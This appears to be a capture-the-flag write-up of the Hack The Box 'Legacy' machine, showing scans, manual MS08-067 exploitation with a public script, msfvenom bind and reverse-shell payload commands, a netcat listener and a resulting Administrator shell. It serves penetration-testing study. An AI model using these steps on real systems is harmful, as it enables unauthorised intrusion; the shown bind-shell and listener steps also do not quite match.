---
layout: post
title: HTB Legacy Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/legacy.png
tags: [HTB, OSCP, EASY]
---

# Notes
![Legacy](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/legacy.png)


| Name | Legacy |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 14 Mar 2017 |
| DIFFICULTY | Easy |

IP:10.10.10.4

# Port Scan
Like every box, I will start off with a quick nmap scan to identify open ports 

`nmap -p- 10.10.10.4 -oN allPorts.nmap --min-rate 1000 -v -Pn`
```
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

I did a more in-depth scan on each of the ports above but `nmap` was not able to identify much more

`nmap -p 135,139,445 -sVC 10.10.10.4 -oN scriptScan.nmap`
```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc?
139/tcp open  netbios-ssn?
445/tcp open  microsoft-ds?

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```
# SMB
`crackmapexec` or `cme` is a great tool to enumerate SMB. It can enumerate shares, service versions, host OS info, and much more. Running it against `legacy` shows that this machine is running `Windows 5.1`

```
┌─[✗]─[zon@pwn]─[~/htb/legacy]
└──╼ $cme smb 10.10.10.4
SMB         10.10.10.4      445    LEGACY           [*] Windows 5.1 (name:LEGACY) (domain:legacy) (signing:False) (SMBv1:True)
```

I was not sure what `Windows 5.1` is so I did a quick google search for `what is windows 5.1` and the first [link](https://encyclopedia2.thefreedictionary.com/Windows+5.1) showed that it is `Windows XP`. `XP` hit end of life on April 8th 2014, so this is super outdated. 

I did another google search for `windows xp smb exploit` and the first couple of results mentioned [MS08–067](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-067). This bug appears to be an unauthenticated RCE via an RPC request. 

#### Exploit
There is a `metasploit` exploit that can be used against this machine located at `exploit/windows/smb/ms08_067_netapi`. But since I'm preparing for my OSCP I will be doing it the manual way.

I found a repo on [github](https://github.com/andyacer/ms08_067) that has a guide on how to exploit this. I first cloned the repo `git clone https://github.com/andyacer/ms08_067/` and made sure `impacket` was installed on my machine. If its not installed on your machine this is how you can get it:
```
git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
cd impacket
pip install .
```

The first thing to do is generate a payload `msfvenom -p windows/shell_bind_tcp RHOST=10.10.14.x LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows`. Then replace the shell code in the script with the output of `msfvenom`.

```
# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Reverse TCP to 10.11.0.157 port 62000:
shellcode=(
PUT MSFVENOM OUTPUT HERE!!!!
)
# ------------------------------------------------------------------------
```

I took a guess that this machine was running Windows XP SP3 English so I used `6` for the OS version. 

Run a listener
```
┌─[✗]─[zon@pwn]─[~/htb/legacy]
└──╼ $sudo nc -lvnp 443
```

Run the exploit
```
┌─[✗]─[zon@pwn]─[~/htb/legacy/ms08_067]
└──╼ $python2 ms08_067_2018.py 10.10.10.4 6 445
#######################################################################
#   MS08-067 Exploit
#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
#
#   Mod in 2018 by Andy Acer:
#   - Added support for selecting a target port at the command line.
#     It seemed that only 445 was previously supported.
#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
#     into this source file.
#######################################################################

Windows XP SP3 English (NX)

[-]Initiating connection
[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
Exploit finish
```

And I get a shell as Administrator
```
┌─[✗]─[zon@pwn]─[~/htb/legacy]
└──╼ $sudo nc -lvnp 443
[sudo] password for zon: 
listening on [any] 443 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>  
```
